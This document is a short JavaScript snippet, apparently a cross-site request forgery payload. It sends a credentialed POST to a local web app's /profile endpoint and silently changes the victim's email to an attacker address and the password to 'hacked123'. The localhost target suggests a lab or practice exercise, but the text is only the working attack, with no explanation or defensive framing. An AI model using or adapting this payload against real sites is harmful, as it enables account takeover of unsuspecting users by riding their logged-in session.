fetch("http://127.0.0.1:5000/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  credentials: "include",
  body: "email=bad@attacker.local&password=hacked123"
});
